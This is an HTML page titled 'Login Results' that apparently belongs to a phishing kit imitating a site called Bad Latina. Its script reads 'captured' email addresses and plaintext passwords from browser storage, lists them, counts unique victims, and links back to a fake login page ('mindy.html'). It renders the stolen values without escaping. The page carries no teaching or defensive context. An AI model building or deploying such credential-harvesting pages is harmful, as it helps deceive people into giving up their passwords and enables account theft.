<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Login Results - Bad Latina</title>
  <meta name="description" content="Login data results" />
  <style>
    :root {
      --bg: #0a0a0a;
      --panel: #111111;
      --border: #1e1e1e;
      --text: #e6e6e6;
      --muted: #a0a0a0;
      --accent: #ffa31a;
      --accent-dark: #ff8c00;
      --success: #00a651;
      --danger: #dc3545;
    }
    
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
      margin: 0;
      padding: 20px;
    }
    
    .container {
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
    }
    
    .header {
      text-align: center;
      margin-bottom: 30px;
    }
    
    .header h1 {
      color: var(--accent);
      font-size: 32px;
      margin: 0 0 10px 0;
    }
    
    .header p {
      color: var(--muted);
      font-size: 16px;
      margin: 0;
    }
    
    .results-section {
      background: var(--panel);
      border: 2px solid var(--border);
      border-radius: 12px;
      padding: 30px;
      margin-bottom: 20px;
    }
    
    .results-section h2 {
      color: var(--accent);
      margin: 0 0 20px 0;
      font-size: 24px;
      border-bottom: 2px solid var(--border);
      padding-bottom: 10px;
    }
    
    .login-item {
      background: var(--bg);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 20px;
      margin-bottom: 15px;
      transition: border-color 0.3s ease;
    }
    
    .login-item:hover {
      border-color: var(--accent);
    }
    
    .login-item:last-child {
      margin-bottom: 0;
    }
    
    .login-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }
    
    .login-number {
      background: var(--accent);
      color: #000;
      padding: 5px 12px;
      border-radius: 20px;
      font-weight: bold;
      font-size: 14px;
    }
    
    .login-timestamp {
      color: var(--muted);
      font-size: 14px;
    }
    
    .login-details {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }
    
    .detail-group {
      display: flex;
      flex-direction: column;
    }
    
    .detail-label {
      color: var(--muted);
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    
    .detail-value {
      color: var(--text);
      font-size: 16px;
      font-weight: bold;
      word-break: break-all;
    }
    
    .detail-value.password {
      font-family: monospace;
      background: rgba(255, 163, 26, 0.1);
      padding: 5px 8px;
      border-radius: 4px;
      border: 1px solid rgba(255, 163, 26, 0.3);
    }
    
    .no-data {
      text-align: center;
      color: var(--muted);
      font-size: 18px;
      padding: 40px;
    }
    
    .actions {
      text-align: center;
      margin-top: 30px;
    }
    
    .btn {
      background: var(--accent);
      color: #000;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      font-size: 14px;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin: 0 10px;
      text-decoration: none;
      display: inline-block;
      transition: all 0.3s ease;
    }
    
    .btn:hover {
      background: var(--accent-dark);
      transform: translateY(-2px);
    }
    
    .btn-danger {
      background: var(--danger);
      color: #fff;
    }
    
    .btn-danger:hover {
      background: #c82333;
    }
    
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
      gap: 15px;
      margin-bottom: 20px;
    }
    
    .stat-card {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 20px;
      text-align: center;
    }
    
    .stat-number {
      color: var(--accent);
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 5px;
    }
    
    .stat-label {
      color: var(--muted);
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    @media (max-width: 768px) {
      .login-details {
        grid-template-columns: 1fr;
      }
      
      .login-header {
        flex-direction: column;
        align-items: flex-start;
        gap: 10px;
      }
      
      .stats {
        grid-template-columns: repeat(2, 1fr);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>üîê Login Results</h1>
      <p>Captured login data from Bad Latina</p>
    </div>
    
    <div class="stats" id="stats">
      <div class="stat-card">
        <div class="stat-number" id="totalLogins">0</div>
        <div class="stat-label">Total Logins</div>
      </div>
      <div class="stat-card">
        <div class="stat-number" id="uniqueEmails">0</div>
        <div class="stat-label">Unique Emails</div>
      </div>
    </div>
    
    <div class="results-section">
      <h2>üìã Captured Login Data</h2>
      <div id="loginList">
        <div class="no-data">No login data found</div>
      </div>
    </div>
    
    <div class="actions">
      <a href="mindy.html" class="btn">‚Üê Back to Login</a>
      <button onclick="clearAllData()" class="btn btn-danger">Clear All Data</button>
    </div>
  </div>

  <script>
    // Load and display login data
    function loadLoginData() {
      const loginData = JSON.parse(localStorage.getItem('loginData') || '[]');
      const loginList = document.getElementById('loginList');
      const stats = calculateStats(loginData);
      
      // Update stats
      document.getElementById('totalLogins').textContent = stats.total;
      document.getElementById('uniqueEmails').textContent = stats.uniqueEmails;
      
      if (loginData.length === 0) {
        loginList.innerHTML = '<div class="no-data">No login data found</div>';
        return;
      }
      
      // Display login data in reverse order (newest first)
      const reversedData = loginData.slice().reverse();
      
      loginList.innerHTML = reversedData.map((login, index) => `
        <div class="login-item">
          <div class="login-header">
            <div class="login-number">#${loginData.length - index}</div>
            <div class="login-timestamp">${formatTimestamp(login.timestamp)}</div>
          </div>
          <div class="login-details">
            <div class="detail-group">
              <div class="detail-label">Email Address</div>
              <div class="detail-value">${login.email}</div>
            </div>
            <div class="detail-group">
              <div class="detail-label">Password</div>
              <div class="detail-value password">${login.password}</div>
            </div>
          </div>
        </div>
      `).join('');
    }
    
    function calculateStats(loginData) {
      const uniqueEmails = new Set(loginData.map(login => login.email)).size;
      
      return {
        total: loginData.length,
        uniqueEmails: uniqueEmails
      };
    }
    
    function formatTimestamp(timestamp) {
      const date = new Date(timestamp);
      return date.toLocaleString();
    }
    
    function clearAllData() {
      localStorage.removeItem('loginData');
      loadLoginData();
    }
    
    // Load data when page loads
    document.addEventListener('DOMContentLoaded', loadLoginData);
  </script>
</body>
</html>
